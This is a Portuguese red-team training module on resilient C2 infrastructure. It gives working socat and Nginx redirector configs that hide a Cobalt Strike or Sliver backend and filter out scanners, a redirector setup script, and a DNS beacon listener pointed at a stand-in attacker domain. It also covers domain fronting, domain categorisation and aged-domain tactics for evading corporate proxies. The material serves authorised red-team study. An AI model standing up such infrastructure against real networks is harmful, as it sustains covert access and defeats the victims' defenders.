---
layout: cyber
section: c2
title: "Infraestrutura Resiliente e Redirectors para C2"
---

# Infraestrutura Resiliente e Redirectors para C2

## C2 Queimado Custa o Engagement

C2 queimado durante engagement custa dias de trabalho e compromete o acesso obtido. Infra resiliente é o que separa red team profissional de pentester que expõe o IP real do C2 na primeira callback. Quando o blue team identifica IP malicioso e bloqueia, a pergunta é: o C2 real estava exposto? Se sim, fim de jogo. Se tinha redirector na frente, basta queimar o redirector, subir outro, e os beacons existentes continuam — desde que configurados pra apontar pra DNS/domínio (não IP direto).

Pra CRTO I/II isso é foundation de todo engagement. Pra OSEP é exigência: configurar e operar infraestrutura multi-tier. Não é opcional.

---

## Arquitetura por Função

### Separação de Infraestrutura por Função

O princípio fundamental: **nunca expor o servidor de C2 real diretamente à internet**. Cada servidor tem uma função e um IP diferente. Queimar um não queima os outros.

```
ARQUITETURA DE 3 CAMADAS:

                          ┌─────────────────┐
                          │   INTERNET      │
                          └────────┬────────┘
                                   │
          ┌────────────────────────┼────────────────────────┐
          │                        │                        │
          ▼                        ▼                        ▼
┌──────────────────┐   ┌──────────────────┐   ┌──────────────────┐
│  PHISHING SERVER │   │  C2 REDIRECTOR   │   │  EXFIL REDIRECTOR│
│  IP: 1.2.3.10    │   │  IP: 1.2.3.20    │   │  IP: 1.2.3.30    │
│  cloudflare/VPS  │   │  VPS/Droplet     │   │  VPS/Droplet     │
│  GoPhish         │   │  SOCAT/Nginx     │   │  SFTP/Nginx      │
└──────────────────┘   └────────┬─────────┘   └────────┬─────────┘
                                │                       │
                                │ VPN/Privado           │
                                ▼                       ▼
                       ┌─────────────────────────────────────────┐
                       │         C2 SERVER (BACKEND)             │
                       │         IP: 10.0.0.5 (privado)          │
                       │         Cobalt Strike / Sliver / Havoc   │
                       │         NUNCA exposto à internet         │
                       └─────────────────────────────────────────┘
```

**Por que separar phishing de C2:**
- Se o phishing server for blacklistado por anti-spam, o C2 não é afetado
- Phishing domains morrem rápido — categorias mudam, reputação cai
- C2 domains precisam de longevidade — domínios com histórico limpo

**Por que separar exfil de C2:**
- Exfiltração frequentemente gera volume alto de tráfego — pode triggar NDR
- Se o canal de exfil for detectado e bloqueado, o beacon C2 permanece ativo
- Exfil pode usar protocolos diferentes (SFTP, HTTPS com mime-type diferente)

---

### Redirectors

#### SOCAT — Redirector Simples TCP/UDP

SOCAT é a solução mais simples para redirecionar tráfego. Sem filtragem de protocolo, sem inspeção — apenas pipe de bytes de porta para porta.

```bash
# Instalar socat
apt install socat -y

# Redirecionar porta 80 do redirector para porta 80 do C2 real
socat TCP4-LISTEN:80,fork TCP4:C2_REAL_IP:80

# Redirecionar HTTPS (porta 443)
socat TCP4-LISTEN:443,fork TCP4:C2_REAL_IP:443

# Redirecionar DNS (UDP)
socat UDP4-LISTEN:53,fork UDP4:C2_REAL_IP:53

# Executar em background como daemon
nohup socat TCP4-LISTEN:443,fork TCP4:10.0.0.5:443 &

# Ou como systemd service:
cat > /etc/systemd/system/socat-c2.service << 'EOF'
[Unit]
Description=SOCAT C2 Redirector
After=network.target

[Service]
ExecStart=/usr/bin/socat TCP4-LISTEN:443,fork TCP4:10.0.0.5:443
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

systemctl enable socat-c2
systemctl start socat-c2
```

**Limitações do SOCAT:** sem filtragem por User-Agent ou path. Qualquer ferramenta de varredura de IP (Shodan, Censys) vai ver a porta aberta e possivelmente fingerprinting do C2.

#### Nginx — Redirector Inteligente com Filtragem

Nginx permite filtragem por User-Agent, path, IP de origem, e outros headers. Apenas tráfego "legítimo" (com o User-Agent correto do beacon) é encaminhado para o C2.

```nginx
# /etc/nginx/sites-available/c2-redirector
server {
    listen 80;
    listen [::]:80;
    server_name redirector.legitimate-looking-domain.com;

    # Redirecionar HTTP para HTTPS
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    listen [::]:443 ssl;
    server_name redirector.legitimate-looking-domain.com;

    ssl_certificate /etc/letsencrypt/live/redirector.legitimate-looking-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirector.legitimate-looking-domain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;

    # Logging separado para análise
    access_log /var/log/nginx/c2-redirector-access.log;
    error_log /var/log/nginx/c2-redirector-error.log;

    location / {
        # Verificar User-Agent do beacon
        # Cobalt Strike por padrão usa "Mozilla/5.0..." mas pode ser customizado
        # Neste exemplo, o beacon usa User-Agent específico configurado no Malleable C2
        if ($http_user_agent !~ "Mozilla/5.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36") {
            # User-Agent não corresponde — retornar 404 ou redirecionar para site legítimo
            return 301 https://www.microsoft.com;
        }

        # Verificar path (Cobalt Strike usa paths específicos definidos no perfil)
        if ($request_uri !~ "^/(updates|sync|cdn|api)/") {
            return 301 https://www.microsoft.com;
        }

        # Encaminhar para C2 real
        proxy_pass https://10.0.0.5:443;
        proxy_ssl_verify off;  # C2 pode usar self-signed internamente

        # Preservar headers originais
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        # Timeouts para beacons de longa duração
        proxy_connect_timeout 60s;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
    }

    # Path "honeyhole" — qualquer scanner vai ver conteúdo legítimo
    location /index.html {
        root /var/www/html;
        index index.html;
    }
}
```

**Ativar e testar:**
```bash
ln -s /etc/nginx/sites-available/c2-redirector /etc/nginx/sites-enabled/
nginx -t
systemctl reload nginx
```

**Filtragem mais avançada (por IP de origem):**
```nginx
# Bloquear países inteiros (usando GeoIP module)
# apt install nginx-module-geoip
geoip_country /usr/share/GeoIP/GeoIP.dat;
map $geoip_country_code $allowed_country {
    default 0;
    US 1;
    BR 1;
    GB 1;
}

server {
    if ($allowed_country = 0) { return 444; }
    # ...
}
```

---

### HTTPS com Let's Encrypt

O beacon precisa de HTTPS para não ser inspecionado. Let's Encrypt fornece certificados gratuitos.

```bash
# Instalar certbot
apt install certbot python3-certbot-nginx -y

# Obter certificado (modo standalone — para antes de subir o Nginx)
certbot certonly --standalone -d redirector.your-domain.com

# OU, se Nginx já estiver rodando:
certbot --nginx -d redirector.your-domain.com

# Auto-renovação (já configurado automaticamente pelo certbot)
certbot renew --dry-run  # testar renovação

# Certificado fica em:
# /etc/letsencrypt/live/redirector.your-domain.com/fullchain.pem
# /etc/letsencrypt/live/redirector.your-domain.com/privkey.pem
```

**Pré-requisito:** o domínio precisa resolver para o IP do redirector. Configure o DNS A record antes de rodar o certbot.

---

### Domain Fronting

#### Conceito

Domain fronting usa CDNs (Content Delivery Networks) para disfarçar o destino real do tráfego:

```
BEACON (vítima)
    │
    │ TLS SNI header: legit-cdn-customer.cloudfront.net  ← CDN vê isso
    │ HTTP Host header: c2.attacker.com                   ← CDN encaminha isso
    │
    ▼
CLOUDFRONT CDN
    │
    │ CDN encaminha baseado no Host header
    │
    ▼
C2 SERVER (attacker.com, como backend do CloudFront)
```

Para o firewall/proxy da vítima, a conexão vai para `legit-cdn-customer.cloudfront.net` — um domínio legítimo da Amazon. O payload real vai para o C2.

#### Por Que Isso Ficou Difícil

A maioria das CDNs grandes (CloudFront, Fastly, Akamai) implementou controles contra domain fronting em 2018-2022:
- CloudFront: verifica que SNI e Host header apontam para o mesmo "distribution"
- Fastly e Cloudflare: similar

Alternativas ainda possíveis:
- CDNs menores ou regionais sem enforcement
- Azure CDN (em certas configurações)
- Mecanismo: o truque depende do backend CDN não verificar a correspondência

**Nota:** Sempre verificar Terms of Service e legalidade da CDN — uso de domain fronting pode violar ToS.

---

### Domain Categorization — "Envelhecimento" de Domínios

#### Por Que Importa

Web proxies corporativos (Zscaler, BlueCoat, Cisco Umbrella) categorizam domínios. Um domínio recém-registrado não tem categoria ou cai em "Newly Registered Websites" — categoria bloqueada na maioria das empresas.

**Objetivo:** o domínio do C2 deve ter categoria "Business", "Technology", "News" ou similar.

#### Estratégia de Categorização

```
Passo 1: Registrar domínio com boa aparência (semanas antes do engagement)
  - Escolher nome que parece empresa legítima
  - Usar Namecheap, Porkbun (não Freenom — já bloqueado)
  - Exemplo: "cloudtech-solutions.com", "nexus-updates.net"

Passo 2: Criar site com conteúdo real
  - WordPress simples, ou site estático gerado
  - Conteúdo sobre "serviços de TI" ou "soluções em nuvem"
  - Google Analytics instalado
  - Algumas páginas linkadas entre si (robots.txt, sitemap.xml)

Passo 3: Submeter para categorização
  Zscaler:  https://sitereview.zscaler.com/
  BlueCoat: https://sitereview.bluecoat.com/
  Fortinet: https://fortiguard.com/webfilter
  Cisco Umbrella: https://investigate.umbrella.com/

Passo 4: Aguardar categorização (1-4 semanas)
  Verificar periodicamente até receber categoria "Business" ou "Technology"

Passo 5: Usar o domínio para C2 após categorizado
  - Configurar HTTPS com Let's Encrypt
  - Configurar Nginx redirector
  - Manter conteúdo legítimo acessível nos paths não-C2
```

---

### Aged Domains — Domínios com Histórico

Comprar domínios expirados que já têm histórico, reputação positiva, e categoria estabelecida.

```bash
# Ferramentas para encontrar aged domains:
# expireddomains.net — maior banco de domínios expirados
# domcop.com — filtrar por idade, PageRank, categorias

# Critérios de seleção:
# 1. Idade: > 2 anos (idealmente > 5 anos)
# 2. Não aparece em blacklists: verificar em MXToolbox, Spamhaus
# 3. Categoria já estabelecida: verificar em Zscaler/BlueCoat
# 4. Histórico limpo: Wayback Machine sem conteúdo malicioso
# 5. Domain Authority > 10 (menos provável de ser bloqueado)

# Verificar reputação antes de comprar:
# Spamhaus DBL: https://check.spamhaus.org/
# IBM X-Force: https://exchange.xforce.ibmcloud.com/
# VirusTotal: https://www.virustotal.com/gui/domain/YOUR-DOMAIN

# Verificar categoria atual:
curl "https://sitereview.zscaler.com/api/v1/category?category=all" \
  -H "Content-Type: application/json" \
  --data '{"url": "cloudtech-solutions.com"}'
```

---

### DNS Beacon como Canal Backup

Quando HTTP/HTTPS são bloqueados, DNS frequentemente ainda funciona (necessário para resolver nomes). DNS beacon é mais lento mas pode ser o último canal disponível.

#### Como Funciona

```
BEACON na rede da vítima
    │
    │ DNS Query: a1b2c3d4.c2.attacker-ns.com  (dados codificados no subdomínio)
    │
    ▼
DNS RESOLVER da empresa (não pode bloquear DNS completamente)
    │
    │ Forward para authoritative NS
    │
    ▼
NS ATTACKER (attacker-ns.com)  ← controlado pelo atacante
    │
    │ Recebe a query, decodifica dados, responde com resposta DNS
    │ (com dados codificados nos records A/TXT/CNAME)
    │
    ▼
BEACON recebe resposta → decodifica comando
```

#### Configuração no Cobalt Strike

```
# No Cobalt Strike, criar listener DNS:
Cobalt Strike → Listeners → Add
  Name: dns-backup
  Payload: windows/beacon_dns/reverse_dns_txt
  Host (DNS beacon): c2.attacker-ns.com
  DNS TXT Record: beacon.c2.attacker-ns.com

# Configurar NS record no seu domínio:
# attacker-ns.com NS ns1.attacker-ns.com
# ns1.attacker-ns.com A [IP do Cobalt Strike server]

# O Cobalt Strike atua como authoritative NS para c2.attacker-ns.com
# Queries para *.c2.attacker-ns.com chegam diretamente ao CS
```

**Velocidade:** DNS beacon é lento por natureza — cada transação é uma query DNS. Cobalt Strike permite ajustar `dns_sleep` para balancear velocidade vs detecção.

---

### Staging Listener vs Long-Haul Listener

#### Staging Listener

Usado para entrega inicial do beacon. Pode ser exposto mais diretamente, pode ser queimado.

```
Características:
- HTTP (sem necessidade de HTTPS perfeito)
- Pode usar domínio recém-registrado
- Curta duração: apenas até todos os beacons fazerem check-in
- Pode ser domínio de phishing reaproveitado

Cobalt Strike:
- Payload: windows/beacon_http/reverse_http (staged)
- Profile: uso de profile simples sem muito OPSEC
- Depois do staging: beacon checa-in no long-haul listener
```

#### Long-Haul Listener

O listener permanente, de longa duração. Protegido por redirectors, domínio com boa reputação, HTTPS válido.

```
Características:
- HTTPS obrigatório (TLS válido)
- Domínio com reputação estabelecida
- Tráfego atrás de redirector Nginx com filtragem
- Sleep alto (1h-8h) com jitter (20-50%)
- Perfil Malleable C2 que imita tráfego legítimo (CDN, Office365, etc.)

Cobalt Strike Malleable C2 para long-haul:
set sleeptime "3600000";    # 1 hora em ms
set jitter    "30";         # 30% de variação aleatória
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/updates/sync";
    client {
        header "Accept" "text/html,application/xhtml+xml";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Cache-Control" "no-cache";
        metadata {
            base64url;
            parameter "v";
        }
    }
    server {
        header "Content-Type" "application/octet-stream";
        header "Cache-Control" "no-store, no-cache";
        output {
            base64url;
            print;
        }
    }
}
```

---

## Na Prática

### Provisionamento de VPS para Redirector

```bash
# Provisionar via DigitalOcean CLI (doctl)
doctl compute droplet create redirector-01 \
  --image ubuntu-22-04-x64 \
  --size s-1vcpu-1gb \
  --region nyc1 \
  --ssh-keys YOUR_KEY_ID

# Ou via Linode/Vultr — diversificar providers
# Não usar o mesmo provider para todos os redirectors

# Hardening básico do redirector:
# 1. Mudar SSH para porta não-padrão
sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
systemctl restart sshd

# 2. Firewall: apenas portas necessárias
ufw default deny incoming
ufw allow 2222/tcp  # SSH
ufw allow 80/tcp    # HTTP (redirect para HTTPS)
ufw allow 443/tcp   # HTTPS beacon
ufw enable

# 3. Fail2ban para SSH
apt install fail2ban -y
systemctl enable fail2ban
```

### Script de Setup Completo do Redirector

```bash
#!/bin/bash
# setup-redirector.sh — configuração completa de redirector HTTPS
# Uso: ./setup-redirector.sh DOMAIN C2_BACKEND_IP

DOMAIN="$1"
C2_IP="$2"

if [ -z "$DOMAIN" ] || [ -z "$C2_IP" ]; then
    echo "Uso: $0 <domain> <c2_backend_ip>"
    exit 1
fi

echo "[*] Instalando dependências..."
apt update -qq
apt install -y nginx certbot python3-certbot-nginx socat

echo "[*] Configurando Nginx..."
cat > /etc/nginx/sites-available/c2-redirector << EOF
server {
    listen 80;
    server_name ${DOMAIN};
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl;
    server_name ${DOMAIN};

    ssl_certificate /etc/letsencrypt/live/${DOMAIN}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/${DOMAIN}/privkey.pem;

    # Filtragem por User-Agent
    location / {
        if (\$http_user_agent !~ "Mozilla/5.0") {
            return 301 https://www.microsoft.com;
        }
        proxy_pass https://${C2_IP}:443;
        proxy_ssl_verify off;
        proxy_set_header Host \$host;
        proxy_read_timeout 3600s;
    }

    # Conteúdo fake para scanners
    location /index.html {
        return 200 '<html><body>Welcome</body></html>';
        add_header Content-Type text/html;
    }
}
EOF

ln -sf /etc/nginx/sites-available/c2-redirector /etc/nginx/sites-enabled/
nginx -t

echo "[*] Obtendo certificado Let's Encrypt..."
certbot --nginx -d "${DOMAIN}" --non-interactive --agree-tos -m admin@${DOMAIN}

echo "[*] Reiniciando Nginx..."
systemctl restart nginx

echo "[+] Redirector configurado em https://${DOMAIN} → ${C2_IP}"
```

---

## Exemplos de Código / Comandos

### Verificar Categorização de Domínio via API

```python
#!/usr/bin/env python3
"""Verificar categorização de domínio em múltiplos serviços."""
import requests
import json

def check_zscaler(domain):
    """Verificar categoria no Zscaler."""
    url = "https://sitereview.zscaler.com/api/v1/category"
    data = {"url": domain}
    try:
        r = requests.post(url, json=data, timeout=10)
        return r.json()
    except Exception as e:
        return {"error": str(e)}

def check_ibm_xforce(domain):
    """Verificar reputação no IBM X-Force Exchange."""
    url = f"https://api.xforce.ibmcloud.com/url/{domain}"
    headers = {"Accept": "application/json"}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        return r.json()
    except Exception as e:
        return {"error": str(e)}

def check_virustotal(domain, api_key):
    """Verificar reputação no VirusTotal."""
    url = f"https://www.virustotal.com/api/v3/domains/{domain}"
    headers = {"x-apikey": api_key}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        data = r.json()
        attrs = data.get("data", {}).get("attributes", {})
        return {
            "reputation": attrs.get("reputation"),
            "categories": attrs.get("categories"),
            "malicious": attrs.get("last_analysis_stats", {}).get("malicious", 0)
        }
    except Exception as e:
        return {"error": str(e)}

if __name__ == "__main__":
    import sys
    domain = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    vt_key = sys.argv[2] if len(sys.argv) > 2 else ""

    print(f"[*] Verificando: {domain}")
    print(f"Zscaler: {json.dumps(check_zscaler(domain), indent=2)}")
    print(f"IBM X-Force: {json.dumps(check_ibm_xforce(domain), indent=2)}")
    if vt_key:
        print(f"VirusTotal: {json.dumps(check_virustotal(domain, vt_key), indent=2)}")
```

### Teste de Conectividade do Redirector

```bash
# Testar se redirector está funcionando com User-Agent correto
curl -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
     https://redirector.your-domain.com/updates/sync

# Testar bloqueio de User-Agent incorreto (deve retornar redirect para microsoft.com)
curl -v -H "User-Agent: python-requests/2.28.0" \
     https://redirector.your-domain.com/updates/sync

# Verificar headers do redirector (não deve vazar info do backend)
curl -I https://redirector.your-domain.com/

# Verificar certificado
openssl s_client -connect redirector.your-domain.com:443 -servername redirector.your-domain.com
```

### Diagrama Completo de Arquitetura Resiliente

```
╔══════════════════════════════════════════════════════════════════════════╗
║              ARQUITETURA DE INFRAESTRUTURA RESILIENTE                  ║
╚══════════════════════════════════════════════════════════════════════════╝

REDE DA VÍTIMA                          INTERNET                 ATTACKER INFRA
═══════════════                      ═══════════                ════════════════

                                     ┌──────────────────────────────────────┐
                                     │         CAMADA DE REDIRECTORS        │
                                     │                                      │
[BEACON-1] ──HTTPS──▶ [REDIRECTOR-1] │ IP: 1.2.3.20              Nginx+TLS │
  (workstation)        domain-a.com  │ User-Agent filter                    │
                                     │ Let's Encrypt cert                   │
                            │        └──────────────┬───────────────────────┘
                            │                       │
[BEACON-2] ──DNS──▶  [DNS REDIRECTOR]               │ VPN Tunnel / wireguard
  (DMZ server)        ns1.domain-b.com              │ (privado — não exposto)
                            │                       │
                            │        ┌──────────────▼───────────────────────┐
                            └───────▶│        C2 SERVER (BACKEND)           │
                                     │        IP: 10.99.0.5 (privado)       │
[BEACON-3] ──HTTP──▶ [REDIRECTOR-2]  │        Cobalt Strike / Sliver        │
  (servidor crítico)  domain-c.com   │        NUNCA exposto à internet      │
                            │        │                                      │
                            └───────▶│  Teamserver: ts.attacker.internal    │
                                     │  DNS Listener: port 53               │
                                     │  HTTP Listener: port 80 (via proxy)  │
                                     │  HTTPS Listener: port 443 (via proxy)│
                                     └──────────────────────────────────────┘

SEPARAÇÃO DE FUNÇÃO:
┌─────────────────────────┐  ┌─────────────────────────┐  ┌──────────────────────┐
│   PHISHING SERVER       │  │   C2 REDIRECTOR(s)       │  │   EXFIL SERVER       │
│   IP: 1.2.3.10          │  │   IP: 1.2.3.20 / .21    │  │   IP: 1.2.3.30       │
│   GoPhish               │  │   Nginx com filtragem    │  │   SFTP / HTTPS       │
│   Domínio novo          │  │   Domínio aged/cat.      │  │   Domínio separado   │
│   Vida curta            │  │   Vida média (semanas)   │  │   Vida variável      │
│   QUEIMAR: não afeta C2 │  │   QUEIMAR: trocar por    │  │   QUEIMAR: beacon    │
│                         │  │   redirector novo        │  │   C2 continua ativo  │
└─────────────────────────┘  └─────────────────────────┘  └──────────────────────┘

FLUXO DE STAGING vs LONG-HAUL:

STAGING (inicial):
[vítima] → payload.exe → [staging listener: nova-vps.com:80] → stage2 beacon

LONG-HAUL (persistente):
[beacon] → HTTPS/8h sleep → [aged-domain.com:443 (redirector)] → [C2 backend]

Se redirector for queimado:
1. Provisionar novo redirector em < 30 min
2. Novo SOCAT/Nginx apontando para mesmo C2 backend
3. Atualizar beacon com novo domain via Malleable C2 fallback channels
   (ou aguardar beacons existentes fazerem retry via DNS backup channel)
```

---

## Detecção e OPSEC

### O Que o Blue Team Procura

| Indicador | Detecção | Contrameddida |
|---|---|---|
| Beacon interval regular | NDR/SIEM: padrão de tempo fixo | Jitter 20-50% |
| Certificate transparency logs | CT logs revelam novos certs | Usar wildcard cert, ou cert old domain |
| ASN/IP de VPS conhecida | Threat intel: IPs de Digital Ocean/Vultr bloqueados | Usar múltiplos providers, rodar por ISP residencial |
| SNI revela C2 domain | TLS inspection pelo proxy corporativo | Domain fronting, ou domain com boa reputação |
| High entropy payload em HTTP | DPI/NDR detecta shellcode encriptado | Malleable C2 com encoding que imita tráfego normal |
| DNS queries para novo domínio | DNS monitoring: domínio novo = suspeito | Aged domains, ou domínio categorizado |
| GeoIP inconsistência | Threat intel: VPS em país diferente do domínio | Provisionar VPS próximo à vítima |

### Checklist de OPSEC para Infraestrutura

```
Antes do Engagement:
□ Domínios comprados com privacidade WHOIS (Namecheap WhoisGuard)
□ Domínios verificados em todas as blacklists (Spamhaus, SURBL, VirusTotal)
□ Domínios com categoria estabelecida (Zscaler, BlueCoat)
□ Certificados Let's Encrypt válidos em todos os redirectors
□ Nginx configurado com filtragem de User-Agent
□ Firewall: apenas portas necessárias abertas em cada servidor
□ Servidores atrás de VPN privada (Wireguard) entre si
□ Logs de acesso: separar tráfego legítimo de beacon traffic
□ Domínio do phishing: diferente do domínio do C2

Durante o Engagement:
□ Monitorar saúde dos redirectors: nginx -t, journalctl
□ Verificar periodicamente que C2 backend não é acessível diretamente
□ Rotacionar redirectors se houver suspeita de queima
□ Manter staging listener separado do long-haul listener
□ Usar sleep alto (> 30min) com jitter em produção

Após o Engagement:
□ Remover todos os beacons (jobs do CS: beacon-remove-all)
□ Destruir VPS dos redirectors
□ Revogar certificados se domínio for descartado
□ Destruir C2 server backend ou remover todos os listeners
□ Deletar logs que contenham dados da vítima
```

### Verificar se C2 Está Exposto Diretamente

```bash
# De uma máquina externa (não o redirector):
# Tentar conectar direto no C2 backend — deve ser INACESSÍVEL
nmap -p 80,443 C2_BACKEND_IP
# Resultado esperado: all ports filtered/closed

# Do redirector, verificar que encaminha corretamente:
curl -v -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
     https://redirector.domain.com/updates/sync
# Resultado esperado: resposta do C2

# Teste de filtragem (deve retornar redirect ou 404):
curl -v -H "User-Agent: Shodan" https://redirector.domain.com/
# Resultado esperado: 301 para microsoft.com ou 404
```

---

## Módulos Relacionados

`01_cobalt_strike_fundamentos.md` mostra a configuração do Malleable C2 que afeta o perfil de tráfego do redirector. `06_sliver_c2.md` cobre Sliver e seu modelo mTLS distinto. `01_fundamentos/04_malware_essentials.md` cobre o beacon que conecta nessa infra. `03_acesso_inicial/04_password_spraying_owa.md` é a fase de acesso inicial que tipicamente roda em phishing server separado.

---

## Leitura Complementar

- Red Team Infrastructure Wiki — https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki
- Cobalt Strike Infrastructure — https://blog.cobaltstrike.com/2014/01/14/
- SpecterOps Redirectors — https://posts.specterops.io/
- "Attacking and Defending Malleable C2" — SpecterOps
- expireddomains.net — https://www.expireddomains.net/
- Certbot — https://certbot.eff.org/
- "Domain Fronting is Dead, Long Live Domain Fronting" — NCC Group
